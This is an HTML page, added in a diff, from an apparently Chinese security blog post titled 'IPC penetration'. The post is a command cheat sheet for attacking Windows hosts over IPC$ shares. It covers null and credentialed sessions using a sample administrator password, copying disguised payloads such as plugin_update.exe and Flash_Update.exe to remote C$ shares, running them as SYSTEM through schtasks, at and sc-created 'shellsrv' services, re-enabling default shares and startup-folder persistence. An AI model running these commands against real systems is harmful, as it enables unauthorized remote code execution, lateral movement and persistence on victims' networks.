@@ -1,0 +1,279 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="generator" content="Gridea Pro 1.3.0-beta.2">
+<title>IPC渗透 | CXAQHQ</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1794544184">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="/styles/main.css">
+<link rel="alternate" type="application/rss+xml" title="IPC渗透 | CXAQHQ - RSS Feed" href="/feed.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <meta name="description" content="自启动目录 #系统自启动 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #用户自启动 c:\users\用户名\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup 查看本机连接共享情况 n...">
+<link rel="canonical" href="blog.cxaqhq.cn/post/ipc-shen-tou/">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"IPC渗透","url":"blog.cxaqhq.cn/post/ipc-shen-tou/","description":"自启动目录 #系统自启动 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp #用户自启动 c:\\users\\用户名\\appdata\\roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 查看本机连接共享情况 n...","datePublished":"2023-05-06T00:00:00+08:00","dateModified":"2026-11-13T12:24:53+08:00","author":{"@type":"Person","name":"CXAQHQ"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/images/avatar.png"},"name":"CXAQHQ"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"blog.cxaqhq.cn","name":"CXAQHQ","position":1},{"@type":"ListItem","item":"blog.cxaqhq.cn/post/ipc-shen-tou/","name":"IPC渗透","position":2}]}</script>
+<meta property="og:title" content="IPC渗透">
+<meta property="og:description" content="自启动目录 #系统自启动 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #用户自启动 c:\users\用户名\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup 查看本机连接共享情况 n...">
+<meta property="og:url" content="blog.cxaqhq.cn/post/ipc-shen-tou/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="CXAQHQ">
+<meta property="og:image" content="/images/avatar.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="blog.cxaqhq.cn/post/ipc-shen-tou/">
+<meta name="twitter:title" content="IPC渗透">
+<meta name="twitter:description" content="自启动目录 #系统自启动 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #用户自启动 c:\users\用户名\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup 查看本机连接共享情况 n...">
+<meta name="twitter:image" content="/images/avatar.png">
+</head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="blog.cxaqhq.cn">
+  <img class="avatar" src="blog.cxaqhq.cn/images/avatar.png?v=1794544184" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/post" class="menu">
+          博客
+        </a>
+      
+    
+      
+        <a href="/memos" class="menu">
+          闪念
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/links" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              IPC渗透
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-05-06
+              </span>
+              <span>
+                3 分钟阅读
+              </span>
+              
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="heading">自启动目录</h3>
+<pre><code>#系统自启动
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+#用户自启动
+c:\users\用户名\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup
+</code></pre>
+<h3 id="heading-1">查看本机连接共享情况</h3>
+<pre><code>net use
+</code></pre>
+<h3 id="heading-2">建立空连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ &quot;&quot; /u:&quot;&quot;
+</code></pre>
+<h3 id="heading-3">建立正常连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ &quot;1qaz@WSX&quot; /user:&quot;Administrator&quot; 
+</code></pre>
+<h3 id="heading-4">查看已建立连接目标主机的共享资源</h3>
+<pre><code>net view \\192.168.1.1
+</code></pre>
+<h3 id="heading-5">查看目标主机时间</h3>
+<pre><code>net time \\192.168.1.1
+</code></pre>
+<h3 id="ip">删除本机与指定ip建立的连接</h3>
+<pre><code>net use \\192.168.1.1\ipc$ /del /y
+</code></pre>
+<h3 id="heading-6">删除本机所有已建立的连接</h3>
+<pre><code>net use * /del /y
+</code></pre>
+<h3 id="heading-7">文件的上传下载与删除</h3>
+<pre><code>copy plugin_update.exe \\192.168.1.1\c$\windows\temp\plugin_update.exe
+[推荐用xcopy]:
+xcopy d:\sqlitedata\*.* \\192.168.1.1\c$\temp /E /Y /D
+（上传本地文件到目标的:c\windows\temp\目录下）
+copy \\192.168.1.1\c$\plugin_update.exe c:\
+（下载目标文件到本地c盘下）
+del \\192.168.1.1\c$\plugin_update.exe /F
+（删除目标文件）
+</code></pre>
+<h3 id="schtasks">创建计划任务之schtasks</h3>
+<pre><code>schtasks /create /tn &quot;plugin_update&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+补充1：schtasks /create /tn &quot;Flash_Update&quot; /tr C:\Users\Public\Flash_Update.exe /sc minute /mo 1 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+
+立即执行计划任务
+schtasks /run /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+
+删除计划任务
+schtasks /F /delete /tn &quot;plugin_update&quot; /S 192.168.1.1 /u administrator /p &quot;1qaz@WSX&quot;
+
+计划任务远程开启默认共享{注意查看目标主机时间}
+schtasks /create /tn &quot;plugin_update&quot; /tr &quot;cmd /c net share c$=c:&quot; /sc once /st 16:25 /S 192.168.1.1 /RU System /u administrator /p &quot;1qaz@WSX&quot;
+</code></pre>
+<h3 id="at">创建计划任务之at</h3>
+<pre><code>（at只支持win03和部分老版本win08，一般情况下，win08-SP1的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）
+
+at \\192.168.1.1 14:05 cmd /c &quot;c:\windows\temp\test.bat&quot; 
+</code></pre>
+<h3 id="sc">SC创建服务</h3>
+<pre><code>（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报1053错误）
+sc \\192.168.1.1 create shellsrv binpath= &quot;c:\shell.exe&quot; start= auto displayname= &quot;shellstart&quot;
+
+sc \\192.168.1.1 create test binpath= &quot;c:\windows\temp\test.bat&quot; start= auto displayname= &quot;shellstart&quot;
+
+sc \\192.168.1.1 start shllsrv
+sc \\192.168.1.1 stop shllsrv
+sc \\192.168.1.1 delete shellsrv
+</code></pre>
+<h3 id="heading-8">删除默认共享</h3>
+<pre><code>net share c$ /del
+</code></pre>
+<h3 id="heading-9">恢复默认共享</h3>
+<pre><code>net share c$=c:
+</code></pre>
+<h3 id="cz">对方的c盘映射为自己的z盘，其他盘类推(不推荐)</h3>
+<pre><code>net use z: \\192.168.1.1\c$ &quot;1qaz@WSX&quot; /user:&quot;administrator&quot;
+</code></pre>
+<h3 id="c">删除映射的c盘，其他盘类推</h3>
+<pre><code>net use c: /del
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="/post/yu-ti-quan-lou-dong/">
+              <h3 class="post-title">
+                域提权漏洞
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="/feed.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  <script>console.log("\n%c ✦ Gridea Pro v1.3.0-beta.2 %c · Theme: notes v1.2.0 · https://gridea.pro %c\n","color:#fadfa3;background:#111111;padding:9px 14px;border-radius:4px 0 0 4px;font-weight:500;font-size:12px","color:#e05c00;background:#fff3ec;padding:9px 14px;border-radius:0 4px 4px 0;font-size:11px","")</script>
+</body>
+</html>
